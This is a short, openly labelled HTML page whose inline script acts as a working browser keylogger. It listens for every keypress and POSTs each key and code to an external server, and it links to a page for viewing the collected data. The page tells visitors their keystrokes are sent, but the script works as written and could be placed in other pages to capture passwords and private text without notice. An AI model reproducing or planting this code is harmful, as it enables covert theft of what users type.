<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Key Logger</title>
  <script>
    document.addEventListener('DOMContentLoaded', (event) => {
      document.addEventListener('keydown', (e) => {
        const key = e.key;
        fetch('https://httpserver-1.onrender.com', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ key: key, code: e.code, keyCode: e.keyCode })
        })
        .then(response => response.text())
        .then(data => console.log('Server response:', data))
        .catch(error => console.error('Error:', error));
      });
    });
  </script>
</head>
<body>
  <h1>Key Logger</h1>
  <p>Press any key to send data to the server.</p>
  <a href="https://httpserver-1.onrender.com/view-data" target="_blank">View Collected Data</a>
</body>
</html>
